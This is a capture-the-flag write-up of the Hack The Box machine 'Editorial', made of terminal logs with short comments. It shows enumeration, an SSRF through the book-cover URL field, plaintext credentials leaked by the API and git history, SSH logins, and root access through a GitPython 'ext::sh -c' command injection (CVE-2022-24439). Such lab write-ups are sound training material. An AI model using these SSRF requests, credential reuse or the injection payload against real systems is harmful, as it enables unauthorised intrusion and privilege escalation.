# Editorial-https://www.hackthebox.com/machines/editorial

```bash
ping 10.129.161.182
PING 10.129.161.182 (10.129.161.182) 56(84) bytes of data.
64 bytes from 10.129.161.182: icmp_seq=1 ttl=63 time=62.3 ms
64 bytes from 10.129.161.182: icmp_seq=2 ttl=63 time=62.0 ms
64 bytes from 10.129.161.182: icmp_seq=3 ttl=63 time=66.3 ms
^C
--- 10.129.161.182 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 62.028/63.528/66.280/1.948 ms

nmap -sV -sC 10.129.161.182
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 04:26 EDT
Nmap scan report for 10.129.161.182
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds

# I have connection problems in this machine.

sudo nano /etc/hosts
10.129.161.182  editorial.htb

ffuf -u http://editorial.htb -H "Host: FUZZ.editorial.htb" -w //usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editorial.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.editorial.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 611 req/sec :: Duration: [0:08:38] :: Errors: 520 ::

gobuster dir -u http://editorial.htb -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://editorial.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2939]
/upload               (Status: 200) [Size: 7140]

# Let's check website. Open Publish with Us and check it with burpsuite.
# put abc to Cover Url related to your book and press preview.

POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://editorial.htb/upload
Content-Type: multipart/form-data; boundary=---------------------------9055860941392399935196845531
Content-Length: 340
Origin: http://editorial.htb
Connection: close

-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookurl"

abc
-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------9055860941392399935196845531--

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 11 Sep 2024 09:27:42 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 61

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg

<img width="1092" alt="image" src="https://github.com/user-attachments/assets/efbb1296-8c51-4581-bcee-482706a9a369">

# We can use it for SSRF.
# Brute force this with intruder

POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://editorial.htb/upload
Content-Type: multipart/form-data; boundary=---------------------------9055860941392399935196845531
Content-Length: 354
Origin: http://editorial.htb
Connection: close

-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:§§/
-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------9055860941392399935196845531--


POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://editorial.htb/upload
Content-Type: multipart/form-data; boundary=---------------------------9055860941392399935196845531
Content-Length: 359
Origin: http://editorial.htb
Connection: close

-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/
-----------------------------9055860941392399935196845531
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------9055860941392399935196845531--
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 11 Sep 2024 09:36:56 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 51

static/uploads/442319d5-2f24-4768-b1cc-e79e57c660bb

# Open Network from inspect. Put http://127.0.0.1:5000/ to cover url, and click on preview.
# Right click on http://editorial.htb/static/uploads/527561d2-68cc-49f3-abd3-3bbdca77c91f request and click on open in new Tab.
# I also tried visiting directly visiting http://editorial.htb/static/uploads/527561d2-68cc-49f3-abd3-3bbdca77c91f but it didn't work for me so you can try my way.

cat 527561d2-68cc-49f3-abd3-3bbdca77c91f                                   
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.",
"endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},
{"coupons":{"description":"Retrieve the list of coupons to use in our library.",
"endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},
{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.",
"endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},
{"platform_use":{"description":"Retrieve examples of how to use the platform.",
"endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],
"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.",
"endpoint":"/api/latest/metadata/changelog","methods":"GET"}},
{"latest":{"description":"Retrieve the last version of api.",
"endpoint":"/api/latest/metadata","methods":"GET"}}]}

# Open Network from inspect. Put http://127.0.0.1:5000/api/latest/metadata/messages/authors to cover url, and click on preview.
# Open in new tab and it will outomaticly download the file.

{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\n
Please be sure to change your password as soon as possible for security purposes.
\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards,
Editorial Tiempo Arriba Team."}

# Use credentials for ssh: dev dev080217_devAPI!@

ssh dev@10.129.161.151               
The authenticity of host '10.129.161.151 (10.129.161.151)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.161.151' (ED25519) to the list of known hosts.
dev@10.129.161.151's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 11 02:37:58 PM UTC 2024

  System load:           0.0
  Usage of /:            60.7% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.161.151
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6ca8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cat user.txt
83d5e15db06fd77eadd149ed9a07d870
```
```bash
dev@editorial:~$ sudo -l
[sudo] password for dev: 
Sorry, user dev may not run sudo on editorial.

dev@editorial:~$ cd ..
dev@editorial:/home$ cd ..
dev@editorial:/$ find . -name configuration*
./sys/devices/pci0000:00/0000:00:11.0/0000:02:00.0/usb2/configuration
./sys/devices/pci0000:00/0000:00:11.0/0000:02:00.0/usb2/2-1/configuration
./sys/devices/pci0000:00/0000:00:11.0/0000:02:00.0/usb2/2-2/configuration
./sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/usb1/configuration
find: ‘./sys/fs/pstore’: Permission denied
find: ‘./sys/fs/bpf’: Permission denied
find: ‘./run/udisks2’: Permission denied
find: ‘./run/user/1001/systemd/inaccessible/dir’: Permission denied
find: ‘./run/sudo’: Permission denied
find: ‘./run/multipath’: Permission denied
find: ‘./run/cryptsetup’: Permission denied
find: ‘./run/credentials/systemd-sysusers.service’: Permission denied
find: ‘./run/systemd/propagate’: Permission denied
find: ‘./run/systemd/unit-root’: Permission denied
find: ‘./run/systemd/inaccessible/dir’: Permission denied
find: ‘./run/lvm’: Permission denied
find: ‘./run/lock/lvm’: Permission denied
find: ‘./run/initramfs’: Permission denied
find: ‘./home/prod’: Permission denied
find: ‘./etc/ssl/private’: Permission denied
find: ‘./etc/audit’: Permission denied
find: ‘./etc/polkit-1/localauthority’: Permission denied
find: ‘./etc/multipath’: Permission denied
find: ‘./boot/lost+found’: Permission denied
find: ‘./lost+found’: Permission denied
./usr/lib/python3/dist-packages/pip/_internal/configuration.py

# Nothing good

dev@editorial:~$ cat /etc/passwd | grep -i sh$
root:x:0:0:root:/root:/bin/bash
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash

dev@editorial:~$ grep -r "prod" ./
./apps/.git/logs/refs/heads/master:1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
 1682906108 -0500 commit: change(api): downgrading prod to dev
./apps/.git/logs/HEAD:1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
 1682906108 -0500    commit: change(api): downgrading prod to dev``

dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cd apps
dev@editorial:~/apps$ ls
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
dev@editorial:~/apps$ cd .git
dev@editorial:~/apps/.git$ ls
branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
dev@editorial:~/apps/.git$ cd logs
dev@editorial:~/apps/.git/logs$ ls
HEAD  refs
dev@editorial:~/apps/.git/logs$ cd refs
dev@editorial:~/apps/.git/logs/refs$ ls
heads
dev@editorial:~/apps/.git/logs/refs$ cd heads
dev@editorial:~/apps/.git/logs/refs/heads$ ls
master
dev@editorial:~/apps/.git/logs/refs/heads$ cat master
0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500  commit (initial): feat: create editorial app
3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500  commit: feat: create api to editorial info
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500  commit: change(api): downgrading prod to dev
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500  commit: change: remove debug and update api port
dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500  commit: fix: bugfix in api port endpoint

dev@editorial:~/apps/.git/logs/refs/heads$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
# Prod credentials: 080217_Producti0n_2023!@

ssh prod@10.129.161.151       
prod@10.129.161.151's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 11 09:57:09 PM UTC 2024

  System load:           0.08
  Usage of /:            61.4% of 6.35GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.161.151
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6ca8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 11 15:09:01 2024 from 10.10.16.24
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Sorry, try again.
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
# It is for cloning git but -c protocol.ext.allow=always this part allows malicious codes can be run directly from Git.
prod@editorial:~$ pip3 list
Package               Version
--------------------- ----------------
attrs                 21.2.0
Automat               20.2.0
Babel                 2.8.0
bcrypt                3.2.0
blinker               1.4
certifi               2020.6.20
chardet               4.0.0
click                 8.0.3
colorama              0.4.4
command-not-found     0.3
configobj             5.0.6
constantly            15.1.0
cryptography          3.4.8
dbus-python           1.2.18
distro                1.7.0
distro-info           1.1+ubuntu0.2
Flask                 2.2.2
gitdb                 4.0.10
GitPython             3.1.29
gunicorn              20.1.0
httplib2              0.20.2
hyperlink             21.0.0
idna                  3.3
importlib-metadata    4.6.4
incremental           21.3.0
itsdangerous          2.1.2
jeepney               0.7.1
Jinja2                3.0.3
jsonpatch             1.32
jsonpointer           2.0
jsonschema            3.2.0
keyring               23.5.0
launchpadlib          1.10.16
lazr.restfulclient    0.14.4
lazr.uri              1.0.6
MarkupSafe            2.1.2
more-itertools        8.10.0
netifaces             0.11.0
oauthlib              3.2.0
pexpect               4.8.0
pip                   22.0.2
ptyprocess            0.7.0
pyasn1                0.4.8
pyasn1-modules        0.2.1
PyGObject             3.42.1
PyHamcrest            2.0.2
PyJWT                 2.3.0
pyOpenSSL             21.0.0
pyparsing             2.4.7
pyrsistent            0.18.1
pyserial              3.5
python-apt            2.4.0+ubuntu3
python-debian         0.1.43+ubuntu1.1
python-magic          0.4.24
pytz                  2022.1
PyYAML                5.4.1
requests              2.25.1
SecretStorage         3.3.1
service-identity      18.1.0
setuptools            59.6.0
six                   1.16.0
smmap                 5.0.0
sos                   4.5.6
ssh-import-id         5.11
systemd-python        234
Twisted               22.1.0
ubuntu-drivers-common 0.0.0
ubuntu-pro-client     8001
urllib3               1.26.5
wadllib               1.3.6
Werkzeug              2.2.2
wheel                 0.37.1
xkit                  0.0.0
zipp                  1.0.0
zope.interface        5.4.0

# GitPython 3.1.29  has CVE-2022-24439 allows the attacker to execute arbitrary code https://github.com/gitpython-developers/GitPython/issues/1515.

prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt% >% /tmp/root new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ cat /tmp/root
a14273af694ce89a59e80052ab858f90

``` 
